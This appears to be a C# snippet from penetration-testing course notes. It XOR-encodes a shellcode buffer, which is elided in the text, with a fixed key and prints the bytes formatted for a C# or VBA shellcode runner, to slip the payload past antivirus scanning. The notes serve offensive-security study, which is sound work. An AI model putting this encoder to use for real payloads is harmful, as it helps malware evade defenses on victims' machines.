```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypt_XOR
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[749] {0xfc,...,0xd5 };

            // Encode the payload with XOR (fixed key)
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
			//CSHARP FORMAT
            /*
            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;

            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // Dont append comma for last item
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                if ((count + 1) % 15 == 0)
                {
                    hex.Append("\n");
                }
            }
            */
            //VBA FORMAT

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            uint counter = 0;
            foreach (byte b in encoded)
            {
                //hex.AppendFormat("0x{0:x2}, ", b);
                //VBA FORMAT
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine($"Payload (key: 0xfa):");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
            Console.ReadLine();

            //// Decode the XOR payload
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}

        }
    }
}

```

More Info:
![[Evasion Techniques and Breaching Defenses#6 5 2 Encrypting the C Shellcode Runner]]